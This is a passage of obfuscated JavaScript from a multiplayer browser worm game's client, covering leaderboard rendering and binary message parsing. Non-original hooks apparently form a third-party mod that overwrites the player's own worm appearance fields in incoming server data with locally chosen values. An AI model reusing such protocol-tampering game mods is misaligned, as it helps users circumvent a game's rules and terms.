            this.sortableChildren = true;
            setTimeout(() => {
              if (window._wupin && _wupin.myLocation && _wupin.myLocation.parent) {
                this.globalJoystickPoint = new _0x32defb.Graphics();
                this.globalJoystickPoint.zIndex = 100001;
                this.globalJoystickPoint.alpha = 0.9;
                this.globalJoystickPoint.beginFill(16225317);
                this.globalJoystickPoint.drawCircle(0, 0, this.kh * 0.1);
                this.globalJoystickPoint.endFill();
                this.globalJoystickPoint.lineStyle(1, "black");
                this.globalJoystickPoint.drawCircle(0, 0, this.kh * 0.1);
                this.globalJoystickPoint.endFill();
                _wupin.myLocation.parent.sortableChildren = true;
                _wupin.myLocation.parent.addChild(this.globalJoystickPoint);
                console.log("Global joystick point added with zIndex:", this.globalJoystickPoint.zIndex);
              }
            }, 100);
          });
        }();
        var _0x38cb64 = function () {
          var _0x536625 = _0x503ed4.M(_0x32defb.Container, function () {
            _0x32defb.Container.call(this);
            this.rh = {};
          });
          _0x536625.prototype.lh = function (_0x20e6cf) {
            var _0x3c0332 = 0.5 + Math.cos(_0x1525ec.F * (_0x20e6cf / 1000 / 1.6)) * 0.5;
            for (var _0x3e895 in this.rh) {
              var _0x4616d6 = this.rh[_0x3e895];
              var _0x51ef56 = _0x4616d6.sh;
              _0x4616d6.alpha = 1 - _0x51ef56 + _0x51ef56 * _0x3c0332;
            }
          };
          _0x536625.prototype.Uf = function (_0x1a335a) {
            for (var _0x1901c2 in this.rh) {
              if (_0x1a335a[_0x1901c2] == null || !_0x1a335a[_0x1901c2].hd) {
                _0x503ed4.U(this.rh[_0x1901c2]);
                delete this.rh[_0x1901c2];
              }
            }
            var _0x4724a2 = 0;
            for (var _0x283432 in _0x1a335a) {
              var _0x21a691 = _0x1a335a[_0x283432];
              if (_0x21a691.hd) {
                var _0x44dfd0 = this.rh[_0x283432];
                if (!_0x44dfd0) {
                  var _0x599968 = _0xf1d21a().Lc.Ub().pb(_0x21a691.nd).ub;
                  _0x44dfd0 = new _0x212cf3();
                  _0x44dfd0.texture = _0x599968.Ea();
                  _0x44dfd0.width = 40;
                  _0x44dfd0.height = 40;
                  this.rh[_0x283432] = _0x44dfd0;
                  this.addChild(_0x44dfd0);
                }
                _0x44dfd0.sh = _0x21a691.od;
                _0x44dfd0.position.x = _0x4724a2;
                _0x4724a2 += 40;
              }
            }
          };
          var _0x212cf3 = function () {
            return _0x503ed4.M(_0x32defb.Sprite, function () {
              _0x32defb.Sprite.call(this);
              this.sh = 0;
            });
          }();
          return _0x536625;
        }();
        var _0x171662 = function () {
          var _0x106855 = _0x503ed4.M(_0x32defb.Container, function () {
            _0x32defb.Container.call(this);
            this.bh = true;
            this.th = 12;
            this.uh = 9;
            this.jg = [];
            for (var _0x3ff9c7 = 0; _0x3ff9c7 < 14; _0x3ff9c7++) {
              this.vh();
            }
          });
          _0x106855.prototype.Uf = function (_0x1696dc) {
            var _0x2c73f6 = _0xf1d21a();
            var _0x425304 = _0x2c73f6.dh.hh.xg === _0x1c97c7.Ac.zc;
            var _0x54f8cb = 0;
            var _0xfbc669 = 0;
            if (_0xfbc669 >= this.jg.length) {
              this.vh();
            }
            this.jg[_0xfbc669].wh(1, "white");
            this.jg[_0xfbc669].xh("", _0x503ed4.H("index.game.leader.top10"), "(" + _0x2c73f6.dh.yh + " online.)");
            this.jg[_0xfbc669].position.y = _0x54f8cb;
            _0x54f8cb += this.th;
            _0xfbc669 += 1;
            if (_0x1696dc.zh.length > 0) {
              _0x54f8cb += this.uh;
            }
            for (var _0x3bfc4d = 0; _0x3bfc4d < _0x1696dc.zh.length; _0x3bfc4d++) {
              var _0x228530 = _0x1696dc.zh[_0x3bfc4d];
              var _0x23d266 = _0x2c73f6.Lc.Ub().jb(_0x228530.Ah);
              var _0xe90e3d = "";
              var _0x305c8a = _0x2c73f6.Lc.Xb().textDict[_0x23d266.qb];
              if (_0x305c8a != null) {
                var _0x4197ac = _0x503ed4.I(_0x305c8a);
                if (_0x43c260(_0x4197ac)) {
                  var _0x4e0444 = _0x567dfd(_0x4197ac);
                  _0x4197ac = _0x224eba(_0x4197ac);
                  _0x4197ac = _0x54c117(_0x4197ac);
                } else {
                  _0x4197ac = _0x224eba(_0x4197ac);
                  _0x4197ac = _0x54c117(_0x4197ac);
                }
                _0xe90e3d = _0x553ea5(_0x4197ac, false);
              }
              if (_0xfbc669 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0xfbc669].wh(0.8, _0x23d266.rb.tb);
              this.jg[_0xfbc669].xh("" + (_0x3bfc4d + 1), _0xe90e3d, "" + Math.floor(_0x228530.Bh));
              this.jg[_0xfbc669].position.y = _0x54f8cb;
              _0x54f8cb += this.th;
              _0xfbc669 += 1;
            }
            if (_0x1696dc.Ch.length > 0) {
              _0x54f8cb += this.uh;
            }
            for (var _0x329953 = 0; _0x329953 < _0x1696dc.Ch.length; _0x329953++) {
              var _0x4e54a7 = _0x1696dc.Ch[_0x329953];
              var _0x252279 = _0x2c73f6.dh.hh.yg == _0x4e54a7.Dh;
              var _0x5969ae;
              var _0x893e2f;
              if (_0x252279) {
                _0x5969ae = "white";
                var _0x19f875 = _0x2c73f6.dh.ch.Eh.ma;
                if (_0x43c260(_0x19f875)) {
                  var _0x4e0444 = _0x567dfd(_0x19f875);
                  _0x19f875 = _0x224eba(_0x19f875);
                  _0x19f875 = _0x54c117(_0x19f875);
                } else {
                  _0x19f875 = _0x224eba(_0x19f875);
                  _0x19f875 = _0x54c117(_0x19f875);
                }
                _0x893e2f = _0x553ea5(_0x19f875, false);
              } else {
                var _0x2a9ebf = _0x2c73f6.dh.Fh[_0x4e54a7.Dh];
                if (!_0x5969ae) {
                  _0x5969ae = "white";
                }
                if (_0x2a9ebf != null) {
                  _0x5969ae = _0x425304 ? _0x2c73f6.Lc.Ub().jb(_0x2a9ebf.Eh.Gh).rb.tb : _0x2c73f6.Lc.Ub().ib(_0x2a9ebf.Eh.Hh).tb || _0x5969ae;
                  var _0x4ff9e5 = _0x2a9ebf.Eh.ma;
                  if (this.bh && _0x19c3f8) {
                    if (_0x43c260(_0x4ff9e5)) {
                      var _0x4e0444 = _0x567dfd(_0x4ff9e5);
                      _0x4ff9e5 = _0x224eba(_0x4ff9e5);
                      _0x4ff9e5 = _0x54c117(_0x4ff9e5);
                    } else {
                      _0x4ff9e5 = _0x224eba(_0x4ff9e5);
                      _0x4ff9e5 = _0x54c117(_0x4ff9e5);
                    }
                    _0x893e2f = _0x553ea5(_0x4ff9e5, false);
                  } else {
                    _0x893e2f = "---";
                  }
                } else {
                  _0x5969ae = "gray";
                  _0x893e2f = "?";
                }
              }
              if (_0xfbc669 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0xfbc669].wh(_0x252279 ? 1 : 0.8, _0x5969ae);
              this.jg[_0xfbc669].xh("" + (_0x329953 + 1), _0x893e2f, "" + Math.floor(_0x4e54a7.Bh));
              this.jg[_0xfbc669].position.y = _0x54f8cb;
              _0x54f8cb += this.th;
              _0xfbc669 += 1;
              if (window.vps.lr !== 10 && window.vps.lr > 0 && _0x329953 >= window.vps.lr - 1) {
                break;
              }
            }
            if (_0x2c73f6.dh.Ih > (window.vps.lr === 10 ? _0x1696dc.Ch.length : window.vps.lr)) {
              _0x54f8cb += this.uh;
              if (_0xfbc669 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0xfbc669].wh(1, "white");
              var _0x1a2853 = _0x2c73f6.dh.ch.Eh.ma;
              if (_0x43c260(_0x1a2853)) {
                var _0x4e0444 = _0x567dfd(_0x1a2853);
                _0x1a2853 = _0x224eba(_0x1a2853);
              } else {
                _0x1a2853 = _0x224eba(_0x1a2853);
              }
              _0x1a2853 = _0x54c117(_0x1a2853);
              this.jg[_0xfbc669].xh("" + _0x2c73f6.dh.Ih, _0x553ea5(_0x1a2853, false), "" + Math.floor(_0x2c73f6.dh.ch.Bh));
              this.jg[_0xfbc669].position.y = _0x54f8cb;
              _0x54f8cb += this.th;
              _0xfbc669 += 1;
              _0x54f8cb += this.uh;
            }
            while (this.jg.length > _0xfbc669) {
              _0x503ed4.U(this.jg.pop());
            }
          };
          _0x106855.prototype.vh = function () {
            var _0x5c4603 = new _0x453513();
            _0x5c4603.position.y = 0;
            if (this.jg.length > 0) {
              _0x5c4603.position.y = this.jg[this.jg.length - 1].position.y + this.th;
            }
            this.jg.push(_0x5c4603);
            this.addChild(_0x5c4603);
          };
          var _0x453513 = function () {
            var _0x21f639 = _0x503ed4.M(_0x32defb.Container, function () {
              _0x32defb.Container.call(this);
              this.Jh = new _0x32defb.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Jh.anchor.x = 1;
              this.Jh.position.x = 50;
              this.addChild(this.Jh);
              this.Kh = new _0x32defb.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Kh.anchor.x = 0;
              this.Kh.position.x = 55;
              this.addChild(this.Kh);
              this.Lh = new _0x32defb.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Lh.anchor.x = 1;
              this.Lh.position.x = 240;
              this.addChild(this.Lh);
            });
            _0x21f639.prototype.xh = function (_0x1430a6, _0x464f90, _0x15e45c) {
              this.Jh.text = _0x1430a6;
              this.Lh.text = _0x15e45c;
              this.Kh.text = _0x464f90;
            };
            _0x21f639.prototype.wh = function (_0x5e20da, _0x473408) {
              this.Jh.alpha = _0x5e20da;
              this.Jh.style.fill = _0x473408;
              this.Kh.alpha = _0x5e20da;
              this.Kh.style.fill = _0x473408;
              this.Lh.alpha = _0x5e20da;
              this.Lh.style.fill = _0x473408;
            };
            return _0x21f639;
          }();
          return _0x106855;
        }();
        return _0x313fca;
      }();
      _0x1c97c7.MessageProcessor = function () {
        function _0x2c7a2e(_0x56bca2) {
          this.dh = _0x56bca2;
          this.Nh = [];
          this.Oh = 0;
        }
        _0x2c7a2e.prototype.Ph = function (_0x242598) {
          this.Nh.push(new DataView(_0x242598));
        };
        _0x2c7a2e.prototype.Qh = function () {
          this.Nh = [];
          this.Oh = 0;
        };
        _0x2c7a2e.prototype.Rh = function () {
          for (var _0xe27bf7 = 0; _0xe27bf7 < 16; _0xe27bf7++) {
            if (this.Nh.length === 0) {
              return;
            }
            var _0x17540d = this.Nh.shift();
            try {
              this.Sh(_0x17540d);
            } catch (_0xf4c1c5) {
              throw _0xf4c1c5;
            }
          }
        };
        _0x2c7a2e.prototype.Sh = function (_0x313a90) {
          switch (_0x313a90.ba(0) & 255) {
            case 0:
              this.Th(_0x313a90, 1);
              return;
            case 1:
              this.Uh(_0x313a90, 1);
              return;
            case 2:
              this.Vh(_0x313a90, 1);
              return;
            case 3:
              this.Wh(_0x313a90, 1);
              return;
            case 4:
              this.Xh(_0x313a90, 1);
              return;
            case 5:
              this.Yh(_0x313a90, 1);
              return;
          }
        };
        _0x2c7a2e.prototype.Th = function (_0x81e05c, _0x4bd4ae) {
          this.dh.hh.xg = _0x81e05c.ba(_0x4bd4ae);
          _0x4bd4ae += 1;
          var _0x33ad99 = _0x81e05c.ca(_0x4bd4ae);
          _0x4bd4ae += 2;
          this.dh.hh.yg = _0x33ad99;
          this.dh.ch.Eh.ae = _0x33ad99;
          this.dh.hh.zg = _0x81e05c.ea(_0x4bd4ae);
          _0x4bd4ae += 4;
          this.dh.hh.Ag = _0x81e05c.ea(_0x4bd4ae);
          _0x4bd4ae += 4;
          this.dh.hh.Bg = _0x81e05c.ea(_0x4bd4ae);
          _0x4bd4ae += 4;
          _0xf1d21a().og.af.ng.Uf(this.dh.hh, _0xf1d21a().og.$h.Zh());
          return _0x4bd4ae;
        };
        _0x2c7a2e.prototype.Uh = function (_0x7062fe, _0xc469d8) {
          var _0x3d39a3 = this.Oh++;
          var _0x3e30aa = _0x7062fe.ca(_0xc469d8);
          _0xc469d8 += 2;
          var _0xccd322 = undefined;
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x32dfdf = 0; _0x32dfdf < _0xccd322; _0x32dfdf++) {
            _0xc469d8 = this.bi(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x42f826 = 0; _0x42f826 < _0xccd322; _0x42f826++) {
            _0xc469d8 = this.ci(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x572844 = 0; _0x572844 < _0xccd322; _0x572844++) {
            _0xc469d8 = this.di(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x3035da = 0; _0x3035da < _0xccd322; _0x3035da++) {
            _0xc469d8 = this.ei(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x350472 = 0; _0x350472 < _0xccd322; _0x350472++) {
            _0xc469d8 = this.fi(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x3d78e4 = 0; _0x3d78e4 < _0xccd322; _0x3d78e4++) {
            _0xc469d8 = this.gi(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x1dd597 = 0; _0x1dd597 < _0xccd322; _0x1dd597++) {
            _0xc469d8 = this.hi(_0x7062fe, _0xc469d8);
          }
          _0xccd322 = this._h(_0x7062fe, _0xc469d8);
          _0xc469d8 += this.ai(_0xccd322);
          for (var _0x90708a = 0; _0x90708a < _0xccd322; _0x90708a++) {
            _0xc469d8 = this.ii(_0x7062fe, _0xc469d8);
          }
          if (_0x3d39a3 > 0) {
            _0xc469d8 = this.ji(_0x7062fe, _0xc469d8);
          }
          this.dh.ki(_0x3d39a3, _0x3e30aa);
          return _0xc469d8;
        };
        _0x2c7a2e.prototype.ei = function (_0x4b6c17, _0x300d9b) {
          var _0x24b091 = new _0x1c97c7.Worm.li();
          _0x24b091.ae = _0x4b6c17.ca(_0x300d9b);
          _0x300d9b += 2;
          _0x24b091.Gh = this.dh.hh.xg === _0x1c97c7.Ac.zc ? _0x4b6c17.ba(_0x300d9b++) : _0x498743.ps ? _0x498743.ps : _0x1c97c7.GameParams.Cg;
          _0x24b091.Hh = _0x4b6c17.ca(_0x300d9b);
          _0x498743.p("Hh|lj", _0x300d9b);
          _0x300d9b += 2;
          _0x24b091.ni = _0x4b6c17.ca(_0x300d9b);
          _0x498743.p("ni|mj", _0x300d9b);
          _0x300d9b += 2;
          _0x24b091.oi = _0x4b6c17.ca(_0x300d9b);
          _0x498743.p("oi|nj", _0x300d9b);
          _0x300d9b += 2;
          _0x24b091.pi = _0x4b6c17.ca(_0x300d9b);
          _0x498743.p("pi|pj", _0x300d9b);
          _0x300d9b += 2;
          _0x24b091.qi = _0x4b6c17.ca(_0x300d9b);
          _0x498743.p("qi|oj", _0x300d9b);
          _0x300d9b += 2;
          var _0x3601a = _0x4b6c17.ba(_0x300d9b);
          _0x300d9b += 1;
          var _0x7f931 = "";
          for (var _0x33104e = 0; _0x33104e < _0x3601a; _0x33104e++) {
            _0x7f931 += String.fromCharCode(_0x4b6c17.ca(_0x300d9b));
            _0x300d9b += 2;
          }
          _0x24b091.ma = _0x7f931;
          if (this.dh.hh.yg === _0x24b091.ae) {
            var _0x5c4e2f = Object.keys(_0x498743.pm);
            _0x5c4e2f.forEach(function (_0x44957a) {
              _0x24b091[_0x44957a] = window.vps.PropertyManager[_0x498743.pm[_0x44957a].p];
              _0x4b6c17.setInt16(_0x498743.pm[_0x44957a].i, _0x24b091[_0x44957a]);
            });
            this.dh.ch.ri(_0x24b091);
            _wup.startGame();
          } else {
            var _0x512ae7 = this.dh.Fh[_0x24b091.ae];
            if (_0x512ae7 != null) {
              _0x512ae7.si();
            }
            var _0x2e466a = new _0x1c97c7.Worm(this.dh.hh);
            _0x2e466a.ti(_0xf1d21a().og.af.ng);
            this.dh.Fh[_0x24b091.ae] = _0x2e466a;
            _0x2e466a.ri(_0x24b091);
          }
          _0x498743.ae(_0x4b6c17, _0x24b091, this);
          return _0x300d9b;
        };
        _0x2c7a2e.prototype.fi = function (_0x9d76ab, _0x197e1c) {
          var _0x34b694 = _0x9d76ab.ca(_0x197e1c);
          _0x197e1c += 2;
          var _0x43f4d5 = _0x9d76ab.ba(_0x197e1c);
          _0x197e1c++;
          var _0x3c60c2 = !!(_0x43f4d5 & 1);
          var _0x512c16 = !!(_0x43f4d5 & 2);
          var _0x23f60f = 0;
          if (_0x3c60c2) {
            _0x23f60f = _0x9d76ab.ca(_0x197e1c);
            _0x197e1c += 2;
          }
          var _0x5f0663 = this.vi(_0x34b694);
          if (_0x5f0663 === undefined) {
            return _0x197e1c;
          }
          _0x5f0663.wi = false;
          if (!_0x5f0663.xi) {
            return _0x197e1c;
          }
          var _0x243f9c = this.vi(_0x34b694);
          if (_0x3c60c2 && _0x243f9c !== undefined && _0x243f9c.xi) {
            if (_0x23f60f === this.dh.hh.yg) {
              var _0x2d9535 = this.dh.ch.fh();
              var _0x276bff = _0x5f0663.yi(_0x2d9535.x, _0x2d9535.y);
              Math.max(0, 1 - _0x276bff.distance / (this.dh.eh * 0.5));
              if (_0x276bff.distance < this.dh.eh * 0.5) {
                var _0x4f6db4 = _0xf1d21a().og.af.ng.Wg;
                var _0x2d602a = null;
                if (_0x5f0663 && _0x5f0663.Eh && _0x5f0663.Eh.ma) {
                  _0x2d602a = _0x5f0663.Eh.ma;
                } else if (_0x5f0663 && _0x5f0663.ma) {
                  _0x2d602a = _0x5f0663.ma;
                } else if (_0x5f0663 && _0x5f0663.name) {
                  _0x2d602a = _0x5f0663.name;
                } else if (this.dh && this.dh.Fh && this.dh.Fh[_0x34b694]) {
                  const _0x1e777a = this.dh.Fh[_0x34b694];
                  if (_0x1e777a && _0x1e777a.Eh && _0x1e777a.Eh.ma) {
                    _0x2d602a = _0x1e777a.Eh.ma;
                  }
                }
                _0x4f6db4.mg(_0x512c16, _0x2d602a);
              }
            } else if (_0x34b694 === this.dh.hh.yg) ;else {
              var _0x2d7d0f = this.dh.ch.fh();
              var _0x1e63db = _0x5f0663.yi(_0x2d7d0f.x, _0x2d7d0f.y);
              Math.max(0, 1 - _0x1e63db.distance / (this.dh.eh * 0.5));
            }
          } else if (_0x34b694 === this.dh.hh.yg) ;else {
            var _0x565dc3 = this.dh.ch.fh();
            var _0x5ddf52 = _0x5f0663.yi(_0x565dc3.x, _0x565dc3.y);
            Math.max(0, 1 - _0x5ddf52.distance / (this.dh.eh * 0.5));
          }
          return _0x197e1c;
        };
        _0x2c7a2e.prototype.ii = function (_0x48c94e, _0x57849e) {
          var _0x3c9283 = _0x48c94e.ca(_0x57849e);
          _0x57849e += 2;
          var _0x2af57d = _0x3c9283 === this.dh.hh.yg ? null : this.dh.Fh[_0x3c9283];
          var _0x2c13da = _0x48c94e.ba(_0x57849e);
          _0x57849e += 1;
          var _0x5e236d = !!(_0x2c13da & 1);
          if (_0x2c13da & 2) {
            var _0x24d2a2 = _0x48c94e.ea(_0x57849e);
            _0x57849e += 4;
            if (_0x2af57d) {
              _0x2af57d.zi(_0x24d2a2);
            }
          }
          var _0x462657 = this.Ai(_0x48c94e.ba(_0x57849e++), _0x48c94e.ba(_0x57849e++), _0x48c94e.ba(_0x57849e++));
          var _0xa0cabc = this.Ai(_0x48c94e.ba(_0x57849e++), _0x48c94e.ba(_0x57849e++), _0x48c94e.ba(_0x57849e++));
          if (_0x2af57d) {
            _0x2af57d.Bi(_0x462657, _0xa0cabc, _0x5e236d);
            var _0x414ccb = this.dh.ch.fh();
            var _0x120949 = _0x2af57d.fh();
            var _0x586a8a = Math.max(0, 1 - Math.hypot(_0x414ccb.x - _0x120949.x, _0x414ccb.y - _0x120949.y) / (this.dh.eh * 0.5));
            _0xf1d21a().Ci.Ye(_0x586a8a, _0x3c9283, _0x5e236d);
          }
          var _0x59db49 = this._h(_0x48c94e, _0x57849e);
          _0x57849e += this.ai(_0x59db49);
          if (_0x2af57d) {
            for (var _0x2e67b8 in _0x2af57d.dd) {
              var _0x40a563 = _0x2af57d.dd[_0x2e67b8];
              if (_0x40a563) {
                _0x40a563.hd = false;
              }
            }
          }
          for (var _0x45c2a6 = 0; _0x45c2a6 < _0x59db49; _0x45c2a6++) {
            var _0x10fd5d = _0x48c94e.ba(_0x57849e);
            _0x57849e++;
            var _0x2a20b5 = _0x48c94e.ba(_0x57849e);
            _0x57849e++;
            if (_0x2af57d) {
              var _0x13536b = _0x2af57d.dd[_0x10fd5d];
              _0x13536b ||= _0x2af57d.dd[_0x10fd5d] = new _0x1c97c7.fd(_0x10fd5d);
              _0x13536b.hd = true;
              _0x13536b.od = Math.min(1, Math.max(0, _0x2a20b5 / 100));
            }
          }
          return _0x57849e;
        };
        _0x2c7a2e.prototype.ji = function (_0x459565, _0x5e6d5b) {
          var _0x3f34e2 = this.dh.ch;
          var _0x3de708 = _0x459565.ba(_0x5e6d5b);
          _0x5e6d5b += 1;
          var _0x2c5294 = !!(_0x3de708 & 1);
          var _0x48bd32 = !!(_0x3de708 & 2);
          var _0x90b10a = !!(_0x3de708 & 4);
          if (_0x48bd32) {
            var _0x16437f = _0x3f34e2.Bh;
            _0x3f34e2.zi(_0x459565.ea(_0x5e6d5b));
            _0x5e6d5b += 4;
            _0x16437f = _0x3f34e2.Bh - _0x16437f;
            if (_0x16437f > 0) {
              _0xf1d21a().og.af.ng.Wg.lg(_0x16437f);
            }
          }
          if (_0x90b10a) {
            this.dh.Di = _0x459565.ea(_0x5e6d5b);
            _0x5e6d5b += 4;
          }
          var _0x5519b0 = this.Ai(_0x459565.ba(_0x5e6d5b++), _0x459565.ba(_0x5e6d5b++), _0x459565.ba(_0x5e6d5b++));
          var _0x149765 = this.Ai(_0x459565.ba(_0x5e6d5b++), _0x459565.ba(_0x5e6d5b++), _0x459565.ba(_0x5e6d5b++));
          _0x3f34e2.Bi(_0x5519b0, _0x149765, _0x2c5294);
          _0xf1d21a().Ci.Ye(0.5, this.dh.hh.yg, _0x2c5294);
          var _0x2a8a40 = this._h(_0x459565, _0x5e6d5b);
          _0x5e6d5b += this.ai(_0x2a8a40);
          for (var _0x4af344 in _0x3f34e2.dd) {
            var _0x4464f4 = _0x3f34e2.dd[_0x4af344];
            if (_0x4464f4) {
              _0x4464f4.hd = false;
            }
          }
          for (var _0x3cc460 = 0; _0x3cc460 < _0x2a8a40; _0x3cc460++) {
            var _0x153f2a = _0x459565.ba(_0x5e6d5b);
            _0x5e6d5b++;
            var _0x17fc7f = _0x459565.ba(_0x5e6d5b);
            _0x5e6d5b++;
            var _0x4432a7 = _0x3f34e2.dd[_0x153f2a];
            if (!_0x4432a7) {
              _0x4432a7 = new _0x1c97c7.fd(_0x153f2a);
              _0x3f34e2.dd[_0x153f2a] = _0x4432a7;
            }
            _0x4432a7.hd = true;
            _0x4432a7.od = Math.min(1, Math.max(0, _0x17fc7f / 100));
          }
          _0xf1d21a().og.af.ng.Ug.Uf(_0x3f34e2.dd);
        };
        _0x2c7a2e.prototype.gi = function (_0x325ca4, _0x1ada41) {
          var _0x3edc90 = this;
          var _0x59aea3 = _0x325ca4.ca(_0x1ada41);
          _0x1ada41 += 2;
          var _0x49c501 = this.vi(_0x59aea3);
          var _0x2f3e06 = _0x325ca4.ea(_0x1ada41);
          _0x1ada41 += 4;
          var _0x4daf02 = this._h(_0x325ca4, _0x1ada41);
          _0x1ada41 += this.ai(_0x4daf02);
          if (_0x49c501) {
            _0x49c501.zi(_0x2f3e06);
            _0x49c501.Ei(function () {
              return _0x3edc90.Ai(_0x325ca4.ba(_0x1ada41++), _0x325ca4.ba(_0x1ada41++), _0x325ca4.ba(_0x1ada41++));
            }, _0x4daf02);
            _0x49c501.kd(true);
            var _0x3a0599 = this.dh.ch.fh();
            var _0x1f3a16 = _0x49c501.fh();
            var _0xe879c0 = Math.max(0, 1 - Math.hypot(_0x3a0599.x - _0x1f3a16.x, _0x3a0599.y - _0x1f3a16.y) / (this.dh.eh * 0.5));
            _0xf1d21a().Ci.We(_0xe879c0, _0x59aea3);
          } else {
            _0x1ada41 += _0x4daf02 * 6;
          }
          return _0x1ada41;
        };
        _0x2c7a2e.prototype.hi = function (_0x45987e, _0x41416b) {
          var _0x9f8162 = _0x45987e.ca(_0x41416b);
          _0x41416b += 2;
          var _0xc1f6d2 = this.dh.Fh[_0x9f8162];
          if (_0xc1f6d2 && _0xc1f6d2.wi) {
            _0xc1f6d2.kd(false);
          }
          _0xf1d21a().Ci.Xe(_0x9f8162);
          return _0x41416b;
        };
        _0x2c7a2e.prototype.bi = function (_0x108f26, _0x2549a3) {
          var _0x54e637 = new _0x1c97c7.Fi.li();
          _0x54e637.ae = _0x108f26.da(_0x2549a3);
          _0x2549a3 += 4;
          _0x54e637.Gh = this.dh.hh.xg === _0x1c97c7.Ac.zc ? _0x108f26.ba(_0x2549a3++) : _0x498743.ps ? _0x498743.ps : _0x1c97c7.GameParams.Cg;
          _0x54e637.Gi = this.Ai(_0x108f26.ba(_0x2549a3++), _0x108f26.ba(_0x2549a3++), _0x108f26.ba(_0x2549a3++));
          _0x54e637.Hh = _0x108f26.ba(_0x2549a3++);
          var _0x3afd53 = this.dh.Hi[_0x54e637.ae];
          if (_0x3afd53 != null) {
            _0x3afd53.si();
          }
          var _0x5b4907 = new _0x1c97c7.Fi(_0x54e637, _0xf1d21a().og.af.ng);
          _0x5b4907.Ii(this.Ji(_0x54e637.ae), this.Ki(_0x54e637.ae), true);
          this.dh.Hi[_0x54e637.ae] = _0x5b4907;
          return _0x2549a3;
        };
        _0x2c7a2e.prototype.ci = function (_0x350b29, _0x3be92f) {
          var _0x5484eb = _0x350b29.da(_0x3be92f);
          _0x3be92f += 4;
          var _0x55daa4 = this.dh.Hi[_0x5484eb];
          if (_0x55daa4) {
            _0x55daa4.Li = 0;
            _0x55daa4.Mi = _0x55daa4.Mi * 1.5;
            _0x55daa4.Ni = true;
          }
          return _0x3be92f;
        };
        _0x2c7a2e.prototype.di = function (_0x6c2f7c, _0x3157fa) {
          var _0x12f99c = _0x6c2f7c.da(_0x3157fa);
          _0x3157fa += 4;
          var _0x348d7b = _0x6c2f7c.ca(_0x3157fa);
          _0x3157fa += 2;
          var _0x45b467 = this.dh.Hi[_0x12f99c];
          if (_0x45b467) {
            _0x45b467.Li = 0;
            _0x45b467.Mi = _0x45b467.Mi * 0.1;
            _0x45b467.Ni = true;
            var _0x11d699 = this.vi(_0x348d7b);
            if (_0x11d699 && _0x11d699.xi) {
              this.dh.hh.yg;
              var _0x46757b = _0x11d699.fh();
              _0x45b467.Ii(_0x46757b.x, _0x46757b.y, false);
            }
          }
          return _0x3157fa;
        };
        var _0x2c0f42 = [34, 29, 26, 24, 22, 20, 18, 17, 15, 14, 13, 12, 11, 10, 9, 8, 8, 7, 6, 6, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 2, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 8, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 20, 22, 24, 26, 29, 34];
        _0x2c7a2e.prototype.Vh = function (_0x41d81f) {
          var _0x3aa4b9 = _0xf1d21a().Lc.Zb().Fb;
          var _0x555ff0 = _0x3aa4b9.getImageData(0, 0, 80, 80);
          var _0x458ce4 = _0x2c0f42[0];
          var _0x3f78f8 = 80 - _0x458ce4;
          var _0x4c3fae = 0;
          for (var _0x1ca1a0 = 0; _0x1ca1a0 < 628; _0x1ca1a0++) {
            var _0x2dd0f4 = _0x41d81f.ba(1 + _0x1ca1a0);
            for (var _0xb897af = 0; _0xb897af < 8; _0xb897af++) {
              var _0x11e201 = (_0x2dd0f4 >> _0xb897af & 1) != 0;
              var _0x59f096 = (_0x458ce4 + _0x4c3fae * 80) * 4;
              if (_0x11e201) {
                _0x555ff0.data[_0x59f096] = 255;
                _0x555ff0.data[_0x59f096 + 1] = 255;
                _0x555ff0.data[_0x59f096 + 2] = 255;
                _0x555ff0.data[_0x59f096 + 3] = 255;
              } else {
                _0x555ff0.data[_0x59f096 + 3] = 0;
              }
              if (++_0x458ce4 >= _0x3f78f8 && ++_0x4c3fae < 80) {
                _0x458ce4 = _0x2c0f42[_0x4c3fae];
                _0x3f78f8 = 80 - _0x458ce4;
              }
            }
          }
          _0x3aa4b9.putImageData(_0x555ff0, 0, 0);
          var _0x18d9a2 = _0xf1d21a().og.af.ng.Tg.qh;
          _0x18d9a2.texture = _0xf1d21a().Lc.Zb().oa;
          _0x18d9a2.texture.update();
        };
        _0x2c7a2e.prototype.Xh = function (_0xbc68cb, _0xb6c864) {
          _0xbc68cb.da(_0xb6c864);
        };
        _0x2c7a2e.prototype.Yh = function (_0x12cd2f, _0x1b1a9f) {
          this.dh.Oi();
        };
        _0x2c7a2e.prototype.Wh = function (_0x440d1c, _0x5bbb2b) {
          this.dh.yh = _0x440d1c.ca(_0x5bbb2b);
          _0x5bbb2b += 2;
          this.dh.Ih = _0x440d1c.ca(_0x5bbb2b);
          _0x5bbb2b += 2;
          var _0x457997 = new _0x1c97c7.Pi();
          _0x457997.Ch = [];
          for (var _0x3ca4c9 = _0x440d1c.ba(_0x5bbb2b++), _0x267795 = 0; _0x267795 < _0x3ca4c9; _0x267795++) {
            var _0x4ecce7 = _0x440d1c.ca(_0x5bbb2b);
